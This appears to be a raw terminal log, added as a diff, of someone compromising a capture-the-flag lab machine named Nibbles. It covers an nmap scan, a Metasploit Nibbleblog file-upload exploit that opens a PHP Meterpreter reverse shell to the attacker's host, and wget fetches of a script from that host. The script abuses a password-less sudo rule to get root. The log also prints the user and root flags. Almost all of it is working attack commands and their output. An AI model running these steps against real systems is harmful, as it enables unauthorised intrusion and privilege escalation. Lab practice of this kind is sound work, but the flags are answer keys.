@@ -1,0 +1,544 @@
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 21:02 IST
+Stats: 0:02:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 21:04 (0:00:00 remaining)
+Stats: 0:02:29 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 21:04 (0:00:06 remaining)
+Stats: 0:02:42 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
+Traceroute Timing: About 32.26% done; ETC: 21:04 (0:00:00 remaining)
+Nmap scan report for 10.10.10.75
+Host is up (0.13s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=7/24%OT=22%CT=1%CU=44082%PV=Y%DS=2%DC=T%G=Y%TM=5D387AA
+OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=8)OPS(
+OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8888/tcp)
+HOP RTT       ADDRESS
+1   133.20 ms 10.10.14.1
+2   133.43 ms 10.10.10.75
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 166.76 seconds
+
+msf5 exploit(multi/http/nibbleblog_file_upload) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+
+[-] Exploit aborted due to failure: no-access: Unable to login. Verify USERNAME/PASSWORD or TARGETURI.
+[*] Exploit completed, but no session was created.
+msf5 exploit(multi/http/nibbleblog_file_upload) > 
+msf5 exploit(multi/http/nibbleblog_file_upload) > set payload /windows/meterpreter/reverse_tcp
+[-] The value specified for payload is not valid.
+msf5 exploit(multi/http/nibbleblog_file_upload) > set payload /php/meterpreter/reverse_tcp    
+[-] The value specified for payload is not valid.
+msf5 exploit(multi/http/nibbleblog_file_upload) > set payload php/meterpreter/reverse_tcp 
+payload => php/meterpreter/reverse_tcp
+msf5 exploit(multi/http/nibbleblog_file_upload) > show options
+
+Module options (exploit/multi/http/nibbleblog_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   nibbles          yes       The password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.10.75      yes       The target address range or CIDR identifier
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the web application
+   USERNAME   admin            yes       The username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Nibbleblog 4.0.3
+
+
+msf5 exploit(multi/http/nibbleblog_file_upload) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[-] Exploit aborted due to failure: no-access: Unable to login. Verify USERNAME/PASSWORD or TARGETURI.
+[*] Exploit completed, but no session was created.
+msf5 exploit(multi/http/nibbleblog_file_upload) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+^C[-] Exploit failed [user-interrupt]: Interrupt 
+[-] exploit: Interrupted
+msf5 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI 10.10.10.75/nibbleblog/
+TARGETURI => 10.10.10.75/nibbleblog/
+msf5 exploit(multi/http/nibbleblog_file_upload) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[-] Exploit aborted due to failure: no-access: Unable to login. Verify USERNAME/PASSWORD or TARGETURI.
+[*] Exploit completed, but no session was created.
+msf5 exploit(multi/http/nibbleblog_file_upload) > show options
+
+Module options (exploit/multi/http/nibbleblog_file_upload):
+
+   Name       Current Setting          Required  Description
+   ----       ---------------          --------  -----------
+   PASSWORD   nibbles                  yes       The password to authenticate with
+   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.10.75              yes       The target address range or CIDR identifier
+   RPORT      80                       yes       The target port (TCP)
+   SSL        false                    no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  10.10.10.75/nibbleblog/  yes       The base path to the web application
+   USERNAME   admin                    yes       The username to authenticate with
+   VHOST                               no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Nibbleblog 4.0.3
+
+
+msf5 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog/
+TARGETURI => /nibbleblog/
+msf5 exploit(multi/http/nibbleblog_file_upload) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] Sending stage (38247 bytes) to 10.10.10.75
+[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.75:40898) at 2019-07-24 23:12:40 +0530
+[+] Deleted image.php
+
+
+meterpreter > 
+meterpreter > show options
+[-] Unknown command: show.
+meterpreter > show
+[-] Unknown command: show.
+meterpreter > shell
+Process 2401 created.
+Channel 0 created.
+
+ls
+db.xml
+cat db.xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<plugin name="My image" author="Diego Najar" version="3.7" installed_at="1512964728"><position type="integer">4</position><title type="string">My image</title><caption type="string"></caption></plugin>
+python
+/bin/sh: 4: python: not found
+echo os.system('/bin/bash')
+/bin/sh: 5: Syntax error: "(" unexpected
+meterpreter > shell
+Process 2405 created.
+Channel 1 created.
+/bin/sh -i
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+db.xml
+$ ls -l
+total 4
+-rw-r--r-- 1 nibbler nibbler 258 Jul 24 13:31 db.xml
+$ cd
+$ ls -l
+total 4
+-rw-r--r-- 1 nibbler nibbler 258 Jul 24 13:31 db.xml
+$ cd ..
+$ ls -la
+total 28
+drwxr-xr-x 7 nibbler nibbler 4096 Dec 10  2017 .
+drwxr-xr-x 3 nibbler nibbler 4096 Dec 28  2017 ..
+drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 categories
+drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 hello
+drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 latest_posts
+drwxr-xr-x 2 nibbler nibbler 4096 Jul 24 13:31 my_image
+drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 pages
+$ cd ../../..
+$ ls -la
+ls: cannot open directory '.': Permission denied
+$ cd ..
+$ ls 
+index.html
+nibbleblog
+$ cd..
+/bin/sh: 11: cd..: not found
+$ cd ..
+$ cd ..
+$ cd..
+/bin/sh: 14: cd..: not found
+$ cd ..
+$ pwd
+/
+$ sudo ls -la
+
+
+
+sudo: unable to resolve host Nibbles: Connection timed out
+sudo: no tty present and no askpass program specified
+$ $ $ $ cd home/
+$ ls
+nibbler
+$ cd nibbler
+$ ls
+personal.zip
+user.txt
+$ cat user.txt
+b02ff32bb332deba49eeaed21152c8d8
+$ sudo -l
+
+sudo: unable to resolve host Nibbles: Connection timed out
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+$ $ cd /home/nibbler/personal/stuff
+/bin/sh: 28: cd: can't cd to /home/nibbler/personal/stuff
+$ pwd
+/home/nibbler
+$ cd personal   
+/bin/sh: 30: cd: can't cd to personal
+$ cd personal/stuff/
+/bin/sh: 31: cd: can't cd to personal/stuff/
+$ cd ~
+/bin/sh: 32: cd: can't cd to ~
+$ cd ..
+$ cd ..
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+$ cd /home/nibbler/personal/stuff/
+/bin/sh: 36: cd: can't cd to /home/nibbler/personal/stuff/
+$ cat /home/nibbler/personal/stuff/monitor.sh
+cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory
+$ sudo -u root /bin/bash
+
+sudo: unable to resolve host Nibbles: Connection timed out
+sudo: no tty present and no askpass program specified
+$ $ id
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+$ mkdir -p personal/stuff/
+mkdir: cannot create directory 'personal': Permission denied
+$ pwd     
+/
+$ cd home/nibbler/
+$ mkdir -p personal/stuff/
+$ cd personal/stuff/
+$ echo bash > monitor.sh
+$ bash monitor.sh
+\
+
+
+
+id
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+pwd
+/home/nibbler/personal/stuff
+ls -la
+total 12
+drwxr-xr-x 2 nibbler nibbler 4096 Jul 24 13:44 .
+drwxr-xr-x 3 nibbler nibbler 4096 Jul 24 13:44 ..
+-rw-r--r-- 1 nibbler nibbler    5 Jul 24 13:44 monitor.sh
+chmod a+x monitor.sh
+ls -la
+total 12
+drwxr-xr-x 2 nibbler nibbler 4096 Jul 24 13:44 .
+drwxr-xr-x 3 nibbler nibbler 4096 Jul 24 13:44 ..
+-rwxr-xr-x 1 nibbler nibbler    5 Jul 24 13:44 monitor.sh
+sudo monitor.sh
+id
+
+
+id
+sudo: unable to resolve host Nibbles: Connection timed out
+sudo: no tty present and no askpass program specified
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+id
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+vi monitor.sh
+Vim: Warning: Output is not to a terminal
+Vim: Warning: Input is not from a terminal
+
+:q             
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+E138: Can't write viminfo file $HOME/.viminfo!
+Press ENTER or type command to continuewq
+
+:wq
+bash: line 17: :wq: command not found
+
+
+
+:q
+bash: line 21: :q: command not found
+:wq
+bash: line 22: :wq: command not found
+^X^C
+Terminate channel 1? [y/N]  y
+meterpreter > shell
+Process 2519 created.
+Channel 2 created.
+ls
+db.xml
+cd ../../../../../
+ls
+index.html
+nibbleblog
+pwd
+/var/www/html
+cd ../../../
+pwd
+/
+cd home/
+ls
+nibbler
+cd nibbler/personal/stuff
+ls
+monitor.sh
+rm -f monitor.sh
+wget 10.10.14.15:8000/monitor.sh
+--2019-07-24 13:50:30--  http://10.10.14.15:8000/monitor.sh
+Connecting to 10.10.14.15:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 15 [text/x-sh]
+Saving to: 'monitor.sh'
+
+     0K                                                       100% 1.67M=0s
+
+2019-07-24 13:50:30 (1.67 MB/s) - 'monitor.sh' saved [15/15]
+
+ls -la
+total 12
+drwxr-xr-x 2 nibbler nibbler 4096 Jul 24 13:50 .
+drwxr-xr-x 3 nibbler nibbler 4096 Jul 24 13:44 ..
+-rw-r--r-- 1 nibbler nibbler   15 Jul 24  2019 monitor.sh
+sudo a+x monitor.sh
+ls -la
+
+
+
+ls
+
+sudo: unable to resolve host Nibbles: Connection timed out
+sudo: no tty present and no askpass program specified
+total 12
+drwxr-xr-x 2 nibbler nibbler 4096 Jul 24 13:50 .
+drwxr-xr-x 3 nibbler nibbler 4096 Jul 24 13:44 ..
+-rw-r--r-- 1 nibbler nibbler   15 Jul 24  2019 monitor.sh
+monitor.sh
+
+ls
+monitor.sh
+chmod a+x monitor.sh   
+ls -la
+total 12
+drwxr-xr-x 2 nibbler nibbler 4096 Jul 24 13:50 .
+drwxr-xr-x 3 nibbler nibbler 4096 Jul 24 13:44 ..
+-rwxr-xr-x 1 nibbler nibbler   15 Jul 24  2019 monitor.sh
+sudo monitor.sh
+id
+sudo: unable to resolve host Nibbles: Connection timed out
+sudo: no tty present and no askpass program specified
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       Shocker
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+echo 127.0.1.2 nibbles >> /etc/hosts
+/bin/sh: 28: cannot create /etc/hosts: Permission denied
+sudo ./monitor.sh
+sudo: unable to resolve host Nibbles: Connection timed out
+ls -la
+total 12
+drwxr-xr-x 2 nibbler nibbler 4096 Jul 24 13:50 .
+drwxr-xr-x 3 nibbler nibbler 4096 Jul 24 13:44 ..
+-rwxr-xr-x 1 nibbler nibbler   15 Jul 24  2019 monitor.sh
+vi monitor.sh
+Vim: Warning: Output is not to a terminal
+Vim: Warning: Input is not from a terminal
+
+E558: Terminal entry not found in terminfo
+'unknown' not known. Available builtin terminals are:
+    builtin_amiga
+    builtin_beos-ansi
+    builtin_ansi
+    builtin_pcansi
+    builtin_win32
+    builtin_vt320
+    builtin_vt52
+    builtin_xterm
+    builtin_iris-ansi
+    builtin_debug
+    builtin_dumb
+defaulting to 'ansi'
+
+#!/bin/ssh -i:wq
+
+
+
+
+^X^Z
+Background channel 2? [y/N]  ^X^Zy
+~
+Background channel 2? [y/N]  y
+meterpreter > shell
+Process 2542 created.
+Channel 3 created.
+ls
+db.xml
+cd /root
+/bin/sh: 2: cd: can't cd to /root
+cd / 
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img--                                                  6,1           All
+initrd.img.old                                                5,1           All
+libINSERT --                                                  4,1           All
+lib64SERT --                                                  3,1           All
+lost+found--                                                  2,1           All
+mediaSERT --                                                  1,9           All
+mnt, 15C
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+cd home/nibbler
+ls
+personal
+personal.zip
+user.txt
+cd peronsl
+/bin/sh: 7: cd: can't cd to peronsl
+cd personla
+/bin/sh: 8: cd: can't cd to personla
+cd personal
+cd stuff
+rm -f monitor.sh
+chmod +x monitor.sh
+chmod: cannot access 'monitor.sh': No such file or directory
+wget 10.10.14.15:8000/monitor.sh
+--2019-07-24 13:55:56--  http://10.10.14.15:8000/monitor.sh
+Connecting to 10.10.14.15:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18 [text/x-sh]
+Saving to: 'monitor.sh'
+
+     0K                                                       100% 2.11M=0s
+
+2019-07-24 13:55:56 (2.11 MB/s) - 'monitor.sh' saved [18/18]
+
+chmod +x monitor.sh
+sudo ./monitor.sh
+id
+id
+sudo: unable to resolve host Nibbles: Connection timed out
+bash: cannot set terminal process group (1301): Inappropriate ioctl for device
+bash: no job control in this shell
+root@Nibbles:/home/nibbler/personal/stuff# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Nibbles:/home/nibbler/personal/stuff# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Nibbles:/home/nibbler/personal/stuff# cd 
+cd 
+root@Nibbles:~# ls 
+ls
+root.txt
+root@Nibbles:~# cat root.txt
+cat root.txt
+b6d745c0dfb6457c55591efc898ef88c
+root@Nibbles:~# 
+
